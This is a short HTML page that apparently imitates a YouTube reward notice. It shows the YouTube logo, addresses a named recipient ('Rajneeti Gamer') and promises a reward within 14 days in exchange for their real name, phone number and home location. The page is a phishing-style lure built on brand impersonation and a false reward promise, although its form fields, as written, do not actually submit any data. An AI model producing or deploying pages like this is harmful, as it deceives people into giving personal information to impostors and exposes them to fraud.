<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YouTube Reward Form</title>

    <style>
        body{
            font-family: Arial, sans-serif;
            background:#f5f5f5;
            text-align:center;
        }
        .container{
            width:90%;
            max-width:400px;
            margin:auto;
            background:white;
            padding:20px;
            margin-top:30px;
            border-radius:10px;
            box-shadow:0 0 10px rgba(0,0,0,0.1);
        }
        img{
            width:120px;
        }
        input{
            width:90%;
            padding:10px;
            margin:6px 0;
        }
        button{
            width:95%;
            padding:12px;
            background:red;
            color:white;
            border:none;
            font-size:16px;
            border-radius:5px;
            cursor:pointer;
        }
        button:hover{
            background:darkred;
        }
    </style>
</head>

<body>

<div class="container">

    <!-- YouTube Logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg">

    <!-- Branding Text -->
    <h3>Dear Rajneeti Gamer,</h3>

    <p>
        Please fill this form very carefully.<br>
        Within 14 days you will receive your reward.
    </p>

    <!-- Form -->
    <form action="success.html" method="get">

        <input type="text" placeholder="Real Name" required>
        <input type="tel" placeholder="Phone Number" required>
        <input type="text" placeholder="Country" required>
        <input type="text" placeholder="State" required>
        <input type="text" placeholder="District" required>
        <input type="text" placeholder="Village & town" required>
        

        <br><br>
        <button type="submit">Submit</button>

    </form>

</div>

</body>
</html>
